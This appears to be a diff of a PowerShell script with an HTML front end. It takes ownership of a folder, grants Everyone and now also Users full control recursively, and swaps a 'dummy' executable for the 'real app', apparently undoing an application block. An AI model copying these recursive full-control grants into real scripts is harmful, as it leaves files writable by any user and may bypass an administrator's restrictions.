@@ -2,7 +2,7 @@ Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 
 # ==========================================
 # 1. THE HTML GUI
-# CHECK#kl th2ngb233utb8f9320b8f08
+# CHECK#kl th2ngb233utb8f9320b8f08 UNCHATS
 # ==========================================
 $html = @"
 <!DOCTYPE html>
@@ -110,6 +110,7 @@ $browser.add_Navigating({
     takeown /f "$folder" /a /r /d y | Out-Null
     icacls "$folder" /reset /t /c /q | Out-Null
     icacls "$folder" /grant "Everyone:(OI)(CI)F" /t /c /q | Out-Null
+    icacls "$folder" /grant "Users:(OI)(CI)F" /t /c /q | Out-Null
 
     # 2. REMOVE DUMMY & RESTORE REAL APP
     if (Test-Path $exePath) { Remove-Item $exePath -Force -ErrorAction SilentlyContinue }
